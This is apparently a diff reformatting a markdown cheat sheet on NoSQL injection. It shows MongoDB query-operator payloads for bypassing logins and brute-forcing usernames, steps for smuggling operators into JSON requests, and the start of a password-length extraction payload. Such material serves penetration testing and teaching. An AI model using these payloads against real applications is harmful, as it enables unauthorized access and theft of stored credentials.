@@ -28,20 +28,15 @@ You can also remove the ```x``` end of the payload.
 
 # NoSQL operator injection
 ```
-    $where - Matches documents that satisfy a JavaScript expression.
-    $ne - Matches all values that are not equal to a specified value.
-    $in - Matches all of the values specified in an array.
-    $regex - Selects documents where values match a specified regular expression.
+$where - Matches documents that satisfy a JavaScript expression.
+$ne - Matches all values that are not equal to a specified value.
+$in - Matches all of the values specified in an array.
+$regex - Selects documents where values match a specified regular expression.
 ```
 ## Submitting query operators
 In JSON messages, you can insert query operators as nested objects. For example, ```{"username":"wiener"}``` becomes ```{"username":{"$ne":"invalid"}}```.
 
-For URL-based inputs, you can insert query operators via URL parameters. For example, username=wiener becomes ```username[$ne]=invalid```. If this doesn't work, you can try the following:
-
-    1. Convert the request method from GET to POST.
-    2. Change the Content-Type header to application/json.
-    3. Add JSON to the message body.
-    4. Inject query operators in the JSON.
+For URL-based inputs, you can insert query operators via URL parameters. For example, username=wiener becomes ```username[$ne]=invalid```. 
 # MongoDB Login Bypass
 ```
 {"$regex":"wien.*"} >> For username
@@ -49,10 +44,10 @@ For URL-based inputs, you can insert query operators via URL parameters. For exa
 {"$in":["admin","administrator","superadmin"]} >> For bruteforce
 ```
 If this doesn't work, you can try the following:
-    Convert the request method from GET to POST.
-    Change the Content-Type header to application/json.
-    Add JSON to the message body.
-    Inject query operators in the JSON.
+    1. Convert the request method from GET to POST.
+    2. Change the Content-Type header to application/json.
+    3. Add JSON to the message body.
+    4. Inject query operators in the JSON.
 # MongoDB Data Retrieving
 ```
 ' && this.password.length < 50%00 >> For extracting password length in URL
